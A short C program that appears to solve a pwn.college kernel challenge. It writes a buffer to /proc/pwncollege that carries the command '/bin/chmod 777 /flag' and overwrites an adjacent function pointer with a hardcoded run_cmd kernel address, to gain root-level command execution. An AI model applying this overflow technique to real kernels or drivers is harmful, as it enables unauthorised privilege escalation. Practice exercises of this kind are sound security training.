#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int fd;
    char payload[0x108];  // 264 bytes
    
    fd = open("/proc/pwncollege", O_WRONLY);
    
    memset(payload, 0, sizeof(payload));
    
    unsigned long run_cmd_addr = 0xffffffff81088680;
    
    char *command = "/bin/chmod 777 /flag";
    
    memcpy(payload, command, strlen(command) + 1);
    
    memcpy(payload + 0x100, &run_cmd_addr, 8);
    
    write(fd, payload, sizeof(payload));
    
    close(fd);
    return 0;
}
